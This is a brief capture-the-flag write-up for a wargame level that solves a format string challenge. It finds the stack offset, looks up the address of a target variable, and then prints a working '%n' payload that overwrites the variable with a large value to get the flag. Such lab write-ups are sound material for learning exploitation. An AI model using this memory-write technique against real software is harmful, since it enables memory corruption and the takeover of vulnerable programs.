this one is also a format string exploit, the code is pretty much the same as
the level 3 but insted of a small value we have to match with a big one, in a
variable again

in order to do this we're going to use %n again and this time the format of %x

lets find the offset, where do we find our strings ?

python -c 'print "AAAA" + "%x" *40'

seems to be the 12th

lets get the address of the variable : info variables

0x08049810  m

ok so "\x10\x98\x04\x08" and what do we need to put in it ?

cmp    eax,0x1025544 = 16930116

we already wrote a 4 bit addr so 16930112 at the 12th spot

python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4

well done, we have the flag :]
